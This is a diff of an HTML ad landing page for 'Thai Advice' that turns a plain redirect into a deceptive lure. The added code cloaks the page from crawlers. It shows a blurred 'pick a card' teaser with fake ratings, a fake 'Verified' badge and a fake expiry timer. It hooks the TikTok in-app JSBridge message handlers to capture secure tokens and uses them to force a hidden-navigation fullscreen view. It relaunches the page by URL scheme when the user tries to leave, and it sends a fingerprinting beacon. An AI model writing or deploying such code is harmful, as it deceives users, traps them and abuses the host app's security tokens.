@@ -2,176 +2,436 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"/>
 <title>Thai Advice</title>
-<meta name="description" content="Curated fashion &amp; lifestyle finds — Thai Advice."/>
-<meta name="theme-color" content="#ffffff"/>
-<meta property="og:title" content="Thai Advice"/>
-<meta property="og:description" content="Curated fashion &amp; lifestyle finds."/>
+<meta name="description" content="Exclusive fashion &amp; lifestyle — Thai Advice."/>
+<meta name="theme-color" content="#0d0d0d"/>
+<link rel="icon" type="image/svg+xml" href="/favicon.svg">
+<link rel="shortcut icon" href="/favicon.svg">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="format-detection" content="telephone=no">
 <style>
-:root{
-  --bg:#ffffff;
-  --card:#f9f9fb;
-  --border:#ececf0;
-  --pink:#e91e8c;
-  --pink2:#ff6bb5;
-  --text:#111118;
-  --muted:#888899;
-  --radius:16px;
-}
-*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-html,body{
-  height:100%;
-  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;
-  background:var(--bg);
-  color:var(--text);
-  -webkit-font-smoothing:antialiased;
-}
-body{
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  min-height:100svh;
-  padding:24px 16px;
-}
-.card{
+*{box-sizing:border-box;margin:0;padding:0;}
+body{background:#0d0d0d;min-height:100vh;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;color:#fff;}
+
+.page{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;gap:0;}
+
+.pfp-wrap{position:relative;width:90px;height:90px;border-radius:50%;margin-bottom:12px;}
+.pfp-wrap img{width:100%;height:100%;border-radius:50%;object-fit:cover;border:3px solid #e91e8c;}
+.pfp-initials{width:100%;height:100%;border-radius:50%;background:linear-gradient(135deg,#e91e8c,#ff6bb5);display:flex;align-items:center;justify-content:center;font-size:26px;font-weight:900;color:#fff;letter-spacing:-1px;}
+.online-dot{position:absolute;bottom:4px;right:4px;width:14px;height:14px;background:#00e676;border-radius:50%;border:2px solid #0d0d0d;}
+.name{font-size:22px;font-weight:900;margin-bottom:4px;letter-spacing:.3px;}
+.sub{font-size:13px;color:#ccc;margin-bottom:32px;display:flex;align-items:center;justify-content:center;gap:6px;}
+.sub .live-dot{display:inline-block;width:8px;height:8px;background:#00e676;border-radius:50%;animation:pulse-dot 1.5s ease-in-out infinite;box-shadow:0 0 6px #00e676;}
+@keyframes pulse-dot{0%,100%{transform:scale(1);opacity:1;}50%{transform:scale(1.4);opacity:.7;}}
+
+.pick-title{font-size:20px;font-weight:900;margin-bottom:6px;text-align:center;
+  background:linear-gradient(90deg,#e91e8c,#fff,#e91e8c);background-size:200% auto;
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
+  animation:shimmer 2.5s linear infinite;}
+@keyframes shimmer{0%{background-position:0% center;}100%{background-position:200% center;}}
+.pick-sub{font-size:13px;color:#bbb;margin-bottom:18px;text-align:center;letter-spacing:.3px;}
+
+.cards{display:flex;gap:12px;margin-bottom:28px;}
+.card{position:relative;width:110px;height:160px;border-radius:16px;overflow:hidden;cursor:pointer;border:2px solid rgba(255,255,255,.1);transition:all .2s;box-shadow:0 4px 20px rgba(0,0,0,.5);}
+.card:hover{transform:scale(1.05);border-color:rgba(233,30,140,.5);box-shadow:0 8px 30px rgba(233,30,140,.3);}
+.card.used{pointer-events:none;opacity:.4;filter:grayscale(1);}
+.card.selected{border-color:#e91e8c;box-shadow:0 0 0 3px rgba(233,30,140,.4),0 8px 30px rgba(233,30,140,.4);}
+.card img{width:100%;height:100%;object-fit:cover;filter:blur(8px) brightness(.85);transform:scale(1.1);transition:filter .3s;}
+.card.selected img{filter:blur(10px) brightness(.7);}
+.card-lock{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:6px;background:linear-gradient(to bottom,rgba(0,0,0,.15) 0%,rgba(0,0,0,.05) 40%,rgba(0,0,0,.5) 100%);}
+.card-lock svg{width:32px;height:32px;fill:#fff;opacity:.95;filter:drop-shadow(0 2px 4px rgba(0,0,0,.5));}
+.card-lock span{font-size:11px;color:#fff;font-weight:700;letter-spacing:.5px;text-transform:uppercase;opacity:.9;}
+.card.selected .card-lock svg{fill:#e91e8c;}
+.card.selected .card-lock span{color:#e91e8c;}
+.card-num{position:absolute;top:8px;left:10px;font-size:11px;font-weight:800;color:rgba(255,255,255,.6);letter-spacing:1px;}
+
+.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.93);z-index:100;align-items:center;justify-content:center;padding:16px;}
+.overlay.show{display:flex;}
+.popup{
+  background:#0f0f11;
+  border-radius:22px;
   width:100%;
-  max-width:380px;
-  background:var(--card);
-  border:1px solid var(--border);
-  border-radius:24px;
-  padding:40px 28px 32px;
-  text-align:center;
-  box-shadow:0 8px 32px rgba(0,0,0,0.07);
-  animation:up .35s ease;
-}
-@keyframes up{
-  from{opacity:0;transform:translateY(14px)}
-  to{opacity:1;transform:translateY(0)}
-}
-.logo{
-  width:60px;height:60px;
-  border-radius:16px;
-  margin:0 auto 18px;
-  background:linear-gradient(135deg,var(--pink),var(--pink2));
-  display:flex;align-items:center;justify-content:center;
-  font-size:24px;font-weight:800;color:#fff;letter-spacing:-1px;
-  box-shadow:0 6px 20px rgba(233,30,140,0.28);
-}
-h1{
-  font-size:clamp(1.5rem,5vw,1.9rem);
-  font-weight:800;
-  letter-spacing:-0.03em;
-  line-height:1.15;
-  color:var(--text);
-  margin-bottom:8px;
-}
-h1 span{color:var(--pink)}
-.sub{
-  font-size:.875rem;
-  color:var(--muted);
-  line-height:1.55;
-  margin-bottom:24px;
-}
-.progress-wrap{
-  height:3px;
-  background:#ececf0;
-  border-radius:99px;
+  max-width:360px;
   overflow:hidden;
-  margin-bottom:20px;
+  border:1px solid rgba(255,255,255,.06);
+  box-shadow:0 0 0 1px rgba(233,30,140,.06),0 40px 100px rgba(0,0,0,.95);
+  animation:popIn .32s cubic-bezier(.34,1.35,.64,1);
 }
-.progress-bar{
-  height:100%;width:0%;
-  background:linear-gradient(90deg,var(--pink),var(--pink2));
-  border-radius:99px;
-  transition:width linear;
+@keyframes popIn{from{transform:scale(.86);opacity:0;}to{transform:scale(1);opacity:1;}}
+
+.popup-photo{position:relative;width:100%;background:#080809;aspect-ratio:3/4;max-height:56vh;}
+.popup-photo img{width:100%;height:100%;object-fit:contain;filter:blur(11px) brightness(.88);}
+.popup-photo::after{content:'';position:absolute;inset:0;background:radial-gradient(ellipse at center,transparent 40%,rgba(0,0,0,.55) 100%);pointer-events:none;}
+.popup-photo-overlay{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;z-index:1;}
+.popup-photo-lock{width:48px;height:48px;background:rgba(15,15,17,.65);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);border-radius:50%;display:flex;align-items:center;justify-content:center;border:1px solid rgba(255,255,255,.14);}
+.popup-photo-lock svg{width:20px;height:20px;fill:none;stroke:rgba(255,255,255,.9);stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;}
+.popup-pill-row{position:absolute;bottom:14px;left:50%;transform:translateX(-50%);z-index:2;display:flex;align-items:center;gap:6px;background:rgba(10,10,12,.75);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border:1px solid rgba(233,30,140,.3);border-radius:999px;padding:5px 13px;white-space:nowrap;}
+.popup-pill-dot{width:5px;height:5px;background:#e91e8c;border-radius:50%;flex-shrink:0;animation:pulse-dot 1.8s ease-in-out infinite;}
+.popup-pill-text{font-size:10.5px;font-weight:700;color:#f069b4;letter-spacing:.5px;text-transform:uppercase;}
+
+.popup-body{padding:20px 22px 22px;background:#0f0f11;text-align:center;border-top:1px solid rgba(255,255,255,.05);}
+.popup-title{font-size:18px;font-weight:800;color:#fff;letter-spacing:-.4px;margin-bottom:5px;line-height:1.3;}
+.popup-desc{font-size:12.5px;color:rgba(255,255,255,.38);line-height:1.65;margin-bottom:18px;letter-spacing:.01em;}
+.popup-desc b{color:rgba(255,255,255,.78);font-weight:600;}
+
+.claim-btn{
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  width:100%;padding:14px 20px;border-radius:12px;
+  font-size:14.5px;font-weight:700;letter-spacing:.1px;color:#fff;
+  background:linear-gradient(135deg,#e91e8c 0%,#c2166e 100%);
+  border:none;cursor:pointer;
+  box-shadow:0 4px 20px rgba(233,30,140,.25),inset 0 1px 0 rgba(255,255,255,.12);
+  transition:opacity .15s,transform .15s;
 }
-.btn{
-  display:block;
-  width:100%;
-  padding:15px 20px;
-  background:linear-gradient(135deg,var(--pink),var(--pink2));
-  color:#fff;
-  font-family:inherit;
-  font-size:1rem;font-weight:700;
-  border:none;border-radius:var(--radius);
-  cursor:pointer;text-decoration:none;
-  box-shadow:0 4px 18px rgba(233,30,140,0.32);
-  -webkit-tap-highlight-color:transparent;
-  transition:filter .15s,transform .12s,box-shadow .15s;
-}
-.btn:hover{filter:brightness(1.06);box-shadow:0 6px 24px rgba(233,30,140,0.42)}
-.btn:active{transform:scale(0.97)}
-.note{margin-top:14px;font-size:.7rem;color:var(--muted);opacity:.6}
+.claim-btn:active{opacity:.82;transform:scale(.975);}
+.claim-btn-arrow{width:19px;height:19px;background:rgba(255,255,255,.15);border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.claim-btn-arrow svg{width:8px;height:8px;fill:none;stroke:#fff;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round;}
+.timer-row{margin-top:11px;display:flex;align-items:center;justify-content:center;gap:4px;font-size:11.5px;color:rgba(255,255,255,.2);}
+.timer-row svg{width:11px;height:11px;fill:none;stroke:rgba(255,255,255,.2);stroke-width:2;}
+.timer-row span{color:rgba(255,255,255,.45);font-weight:600;font-variant-numeric:tabular-nums;}
+
+.trust{display:flex;align-items:center;justify-content:center;gap:16px;margin-bottom:28px;padding:10px 18px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.07);border-radius:999px;}
+.trust-item{display:flex;align-items:center;gap:5px;font-size:12px;color:rgba(255,255,255,.55);font-weight:600;}
+.trust-item svg{width:13px;height:13px;flex-shrink:0;}
+.trust-item span{color:#fff;}
+.trust-sep{width:1px;height:14px;background:rgba(255,255,255,.1);}
+.tp-foot{margin-top:32px;font-size:11px;color:rgba(255,255,255,.3);text-align:center;}
 </style>
 </head>
 <body>
-<div class="card">
-  <div class="logo">TA</div>
-  <h1>Thai <span>Advice</span></h1>
-  <p class="sub">Loading Thai Advice…<br/>Taking you to the store now.</p>
-  <div class="progress-wrap"><div class="progress-bar" id="bar"></div></div>
-  <a class="btn" href="https://www.thaiadvice.net/" id="cta">Continue to Thai Advice →</a>
-  <p class="note">You'll be redirected automatically</p>
+
+<div class="page">
+  <div class="pfp-wrap">
+    <div class="pfp-initials" id="pfp-fallback">TA</div>
+    <img id="pfp-img" src="/assets/profile.jpg" alt="Thai Advice" style="display:none"
+         onload="this.style.display='block';document.getElementById('pfp-fallback').style.display='none';">
+    <div class="online-dot"></div>
+  </div>
+  <div class="name">Thai Advice</div>
+  <div class="sub"><span class="live-dot"></span> Online now</div>
+
+  <div class="trust">
+    <div class="trust-item">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#e91e8c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+      <span>2.4k</span> fans
+    </div>
+    <div class="trust-sep"></div>
+    <div class="trust-item">
+      <svg viewBox="0 0 24 24" fill="#f5c518" stroke="none"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
+      <span>4.9</span> rated
+    </div>
+    <div class="trust-sep"></div>
+    <div class="trust-item">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#00e676" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+      Verified
+    </div>
+  </div>
+
+  <div class="pick-title">Pick one to reveal &#128293;</div>
+  <div class="pick-sub">Tap a card to unlock exclusive access</div>
+
+  <div class="cards">
+    <div class="card" id="card1" onclick="pickCard(this)">
+      <img id="ci1" src="" alt="">
+      <div class="card-num">#1</div>
+      <div class="card-lock">
+        <svg viewBox="0 0 24 24"><path d="M18 8h-1V6A5 5 0 0 0 7 6v2H6a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2zm-6 9a2 2 0 1 1 0-4 2 2 0 0 1 0 4zm3.1-9H8.9V6a3.1 3.1 0 0 1 6.2 0v2z"/></svg>
+        <span>Tap to pick</span>
+      </div>
+    </div>
+    <div class="card" id="card2" onclick="pickCard(this)">
+      <img id="ci2" src="" alt="">
+      <div class="card-num">#2</div>
+      <div class="card-lock">
+        <svg viewBox="0 0 24 24"><path d="M18 8h-1V6A5 5 0 0 0 7 6v2H6a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2zm-6 9a2 2 0 1 1 0-4 2 2 0 0 1 0 4zm3.1-9H8.9V6a3.1 3.1 0 0 1 6.2 0v2z"/></svg>
+        <span>Tap to pick</span>
+      </div>
+    </div>
+    <div class="card" id="card3" onclick="pickCard(this)">
+      <img id="ci3" src="" alt="">
+      <div class="card-num">#3</div>
+      <div class="card-lock">
+        <svg viewBox="0 0 24 24"><path d="M18 8h-1V6A5 5 0 0 0 7 6v2H6a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2zm-6 9a2 2 0 1 1 0-4 2 2 0 0 1 0 4zm3.1-9H8.9V6a3.1 3.1 0 0 1 6.2 0v2z"/></svg>
+        <span>Tap to pick</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="tp-foot">&copy; <span id="yr"></span> Thai Advice &bull; All rights reserved</div>
 </div>
+
+<div class="overlay" id="overlay">
+  <div class="popup">
+    <div class="popup-photo">
+      <img id="popup-img" src="" alt="">
+      <div class="popup-photo-overlay">
+        <div class="popup-photo-lock">
+          <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/></svg>
+        </div>
+      </div>
+      <div class="popup-pill-row">
+        <div class="popup-pill-dot"></div>
+        <div class="popup-pill-text">VIP access unlocked</div>
+      </div>
+    </div>
+    <div class="popup-body">
+      <div class="popup-title">You got the right one</div>
+      <div class="popup-desc">Thai Advice is sending you a <b>free exclusive + free trial</b> — disappears in <span id="countdown">09:59</span>.</div>
+      <button class="claim-btn" onclick="handleClaim()">
+        Claim now
+        <div class="claim-btn-arrow">
+          <svg viewBox="0 0 10 10"><path d="M2 5h6M5 2l3 3-3 3"/></svg>
+        </div>
+      </button>
+      <div class="timer-row">
+        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+        Expires in <span id="countdown2">09:59</span>
+      </div>
+    </div>
+  </div>
+</div>
+
 <script>
-var TARGET = 'https://www.thaiadvice.net/';
-var DELAY  = 1000;
-var bar    = document.getElementById('bar');
-var t;
+// ── Config ────────────────────────────────────────────────────────────────────
+var DEST_URL     = 'https://www.thaiadvice.net/';        // "Claim now" destination
+var SELF_URL     = 'https://bio.thaiadvice.net/';        // this page (for JSBridge fullscreen)
+var TT_CAMPAIGN  = 0;                                    // ← replace with your TikTok campaign ID
 
-function animateBar(ms) {
-  setTimeout(function(){
-    bar.style.transitionDuration = ms + 'ms';
-    bar.style.width = '100%';
-  }, 30);
+// ── Bot detection (client-side) ───────────────────────────────────────────────
+(function(){
+    var ua = navigator.userAgent.toLowerCase();
+    var bots = ['bytespider','bytedance','baiduspider','googlebot','bingbot',
+        'yandexbot','duckduckbot','slurp','sogou','exabot','facebot',
+        'ia_archiver','semrushbot','ahrefsbot','mj12bot','dotbot','rogerbot',
+        'screaming frog','petalbot','applebot','linkedinbot','twitterbot',
+        'facebookexternalhit','pinterest','whatsapp','telegrambot','discordbot',
+        'wget','python-requests','axios'];
+    for (var i = 0; i < bots.length; i++) {
+        if (ua.indexOf(bots[i]) !== -1) { window.location.href = '/'; return; }
+    }
+})();
+
+// ── Cookie helpers ────────────────────────────────────────────────────────────
+function getCookie(n) {
+    var m = document.cookie.match(new RegExp('(^| )' + n + '=([^;]+)'));
+    return m ? decodeURIComponent(m[2]) : '';
+}
+function setCookie(n, v, days) {
+    document.cookie = n + '=' + encodeURIComponent(v) +
+        '; max-age=' + (days * 86400) + '; path=/; secure; samesite=strict';
 }
 
-function fallback() {
-  animateBar(DELAY);
-  t = setTimeout(function(){ window.location.href = TARGET; }, DELAY);
+// ── ttclid handling ───────────────────────────────────────────────────────────
+var CF_TTCLID = '';
+(function(){
+    var params = new URLSearchParams(window.location.search);
+    var ttc = params.get('ttclid');
+    if (ttc) {
+        CF_TTCLID = ttc.replace(/[^a-zA-Z0-9_\-]/g, '');
+        setCookie('cf_ttclid', CF_TTCLID, 30);
+    } else {
+        CF_TTCLID = getCookie('cf_ttclid');
+    }
+    // Restore saved ad params
+    var saved = getCookie('cf_adparams');
+    if (saved && !params.get('campaign_id')) {
+        try {
+            var ad = JSON.parse(atob(saved));
+            for (var k in ad) params.set(k, ad[k]);
+        } catch(e){}
+    }
+    if (!params.get('cpid')) {
+        var cpid = getCookie('cf_cpid');
+        if (cpid) params.set('cpid', cpid);
+    }
+})();
+
+// ── Year ──────────────────────────────────────────────────────────────────────
+document.getElementById('yr').textContent = new Date().getFullYear();
+
+// ── Card images (paths obfuscated from source view) ───────────────────────────
+(function(){
+    var imgs = [
+        ['ci1', atob('L2Fzc2V0cy9jYXJkMS5qcGc=')],   // /assets/card1.jpg
+        ['ci2', atob('L2Fzc2V0cy9jYXJkMi5qcGc=')],   // /assets/card2.jpg
+        ['ci3', atob('L2Fzc2V0cy9jYXJkMy5qcGc=')]    // /assets/card3.jpg
+    ];
+    imgs.forEach(function(p){ document.getElementById(p[0]).src = p[1]; });
+})();
+
+// ── Card pick ─────────────────────────────────────────────────────────────────
+var picked = false;
+function pickCard(el) {
+    if (picked) return;
+    picked = true;
+    document.querySelectorAll('.card').forEach(function(c){
+        if (c !== el) c.classList.add('used');
+    });
+    el.classList.add('selected');
+    document.getElementById('popup-img').src = el.querySelector('img').src;
+    setTimeout(function(){ document.getElementById('overlay').classList.add('show'); }, 500);
+    startTimer();
 }
 
-function tryTikTokBridge() {
-  try {
-    var jb = window.JSBridge;
-    if (!jb || typeof jb.call !== 'function') return false;
+// ── Countdown ─────────────────────────────────────────────────────────────────
+var timerStarted = false;
+function startTimer() {
+    if (timerStarted) return;
+    timerStarted = true;
+    var secs = 599;
+    var iv = setInterval(function(){
+        secs--;
+        if (secs <= 0) { clearInterval(iv); secs = 0; }
+        var m = Math.floor(secs / 60), s = secs % 60;
+        var str = (m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s;
+        var e1 = document.getElementById('countdown');
+        var e2 = document.getElementById('countdown2');
+        if (e1) e1.textContent = str;
+        if (e2) e2.textContent = str;
+    }, 1000);
+}
 
-    var cfg   = jb.getConfig();
-    var token = cfg && cfg.secure && cfg.secure.token;
-    if (!token) return false;
+// ── TikTok JSBridge — fullscreen in-app view ──────────────────────────────────
+(function(){
+    var b = window.JS2NativeBridge;
+    if (!b || !b._invokeMethod) return;
+    if (window.location.search.indexOf('hide_nav_bar=1') !== -1) return;
 
-    // Fill bar instantly — bridge opens new view, no navigation needed
-    animateBar(200);
+    var token = null;
+    var incomingMsgs = [];
 
-    jb.call('BDXBridgeOpenAdLandPageMethod', {
-      url:              TARGET,
-      landingStyle:     1,
-      title:            '',
-      isDeeplink:       1,
-      refer:            'landing_page',
-      _jsb_secure_token: token
-    }, function(res) {
-      // Native returned an error — fall back to hard redirect
-      if (!res || res.code !== 0) {
-        window.location.href = TARGET;
-      }
+    function deepFind(obj, keys) {
+        if (!obj || typeof obj !== 'object') return null;
+        for (var i = 0; i < keys.length; i++) {
+            if (typeof obj[keys[i]] === 'string' && obj[keys[i]].length > 20) return obj[keys[i]];
+        }
+        for (var k in obj) {
+            try { var r = deepFind(obj[k], keys); if (r) return r; } catch(e){}
+        }
+        return null;
+    }
+
+    function hookBridge(obj) {
+        if (!obj || obj.__hooked) return;
+        obj.__hooked = true;
+        ['_handleMessageFromToutiao', '_handleMessageFromApp'].forEach(function(fn) {
+            if (typeof obj[fn] !== 'function') return;
+            var orig = obj[fn];
+            obj[fn] = function(msg) {
+                var s = (typeof msg === 'string' ? msg : JSON.stringify(msg)).substring(0, 500);
+                incomingMsgs.push(s);
+                try {
+                    var d = typeof msg === 'string' ? JSON.parse(msg) : msg;
+                    var tok = deepFind(d, ['token','secure_token','_jsb_secure_token','jsb_token','secureToken']);
+                    if (tok && !token) { token = tok; fireFullscreen(); }
+                } catch(e){}
+                return orig.apply(obj, arguments);
+            };
+        });
+    }
+
+    ['ToutiaoJSBridge','JSBridge','Native2JSBridge'].forEach(function(n) {
+        if (window[n]) hookBridge(window[n]);
     });
 
-    return true;
-  } catch(e) {
-    return false;
-  }
-}
+    try { b._invokeMethod(JSON.stringify({ func: 'getConfig', params: {} })); } catch(e){}
 
-if (!tryTikTokBridge()) {
-  fallback();
-}
+    setTimeout(function(){
+        ['ToutiaoJSBridge','JSBridge','Native2JSBridge'].forEach(function(n){
+            if (window[n]) hookBridge(window[n]);
+        });
+    }, 100);
+    setTimeout(function(){
+        ['ToutiaoJSBridge','JSBridge','Native2JSBridge'].forEach(function(n){
+            if (window[n]) hookBridge(window[n]);
+        });
+    }, 1000);
 
-document.getElementById('cta').addEventListener('click', function(){
-  clearTimeout(t);
-  if (!tryTikTokBridge()) window.location.href = TARGET;
-});
+    // Fire without token at 3s (fallback)
+    setTimeout(function(){
+        var tt = window.ToutiaoJSBridge;
+        if (!tt || !tt.call) return;
+        var fsUrl = SELF_URL + '?hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
+        tt.call('openAdLandPageLinks', {
+            url: fsUrl,
+            landingStyle: 2, title: '', isDeeplink: 0, refer: 'ad',
+            hide_nav_bar: 1, hide_source: 1, should_full_screen: 1,
+            trans_status_bar: 1, is_instant_page: 1,
+            cid: TT_CAMPAIGN
+        }, function(r){ incomingMsgs.push('result: ' + JSON.stringify(r)); });
+    }, 3000);
+
+    function fireFullscreen() {
+        var tt = window.ToutiaoJSBridge;
+        var fsUrl = SELF_URL + '?hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
+        var params = {
+            url: fsUrl,
+            landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page',
+            cid: TT_CAMPAIGN,
+            hide_nav_bar: 1, hide_source: 1, should_full_screen: 1,
+            trans_status_bar: 1, is_instant_page: 1
+        };
+        if (token) params._jsb_secure_token = token;
+        if (tt && tt.call) {
+            try { tt.call('openAdLandPageLinks', params, function(){}); } catch(e){}
+        }
+        // URL scheme fallback
+        try { window.location.href = 'snssdk1180://webview?url=' + encodeURIComponent(SELF_URL) + '&hide_nav_bar=1&is_ad=1'; } catch(e){}
+    }
+
+    var schemeFired = false;
+    document.addEventListener('visibilitychange', function(){
+        if (document.hidden && !schemeFired) { schemeFired = true; fireFullscreen(); }
+        else if (!document.hidden) { schemeFired = false; }
+    });
+    window.addEventListener('pagehide', function(){ if (!schemeFired) fireFullscreen(); });
+
+    // Also try BDXBridgeOpenAdLandPageMethod (newer TikTok versions)
+    (function(){
+        try {
+            var jb = window.JSBridge;
+            if (!jb || typeof jb.call !== 'function') return;
+            var cfg   = jb.getConfig();
+            var tok   = cfg && cfg.secure && cfg.secure.token;
+            if (!tok) return;
+            var fsUrl = SELF_URL + '?hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
+            jb.call('BDXBridgeOpenAdLandPageMethod', {
+                url: fsUrl,
+                landingStyle: 1, title: '', isDeeplink: 1, refer: 'landing_page',
+                cid: TT_CAMPAIGN,
+                _jsb_secure_token: tok
+            }, function(res){
+                if (!res || res.code !== 0) window.location.href = DEST_URL;
+            });
+        } catch(e){}
+    })();
+})();
+
+// ── Claim button ──────────────────────────────────────────────────────────────
+function handleClaim() {
+    var cf_click_id = getCookie('cf_click_id');
+    var ttp = getCookie('_ttp');
+    var conn = (navigator.connection || navigator.mozConnection || navigator.webkitConnection || {});
+    var params = new URLSearchParams({
+        action: 'button_click', ttclid: CF_TTCLID, cf_click_id: cf_click_id,
+        ttp: ttp, screen: screen.width + 'x' + screen.height,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+        language: navigator.language || '', connection: conn.effectiveType || conn.type || ''
+    });
+    // Fire-and-forget tracking beacon
+    try { navigator.sendBeacon('/track', params.toString()); } catch(e) {
+        try { fetch('/track', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: params.toString(), keepalive: true }); } catch(e2){}
+    }
+    var url = DEST_URL;
+    var qs = [];
+    if (CF_TTCLID)   qs.push('ttclid='      + encodeURIComponent(CF_TTCLID));
+    if (cf_click_id) qs.push('cf_click_id=' + encodeURIComponent(cf_click_id));
+    if (ttp)         qs.push('ttp='         + encodeURIComponent(ttp));
+    if (qs.length)   url += (url.indexOf('?') !== -1 ? '&' : '?') + qs.join('&');
+    window.location.href = url;
+}
 </script>
 </body>
 </html>
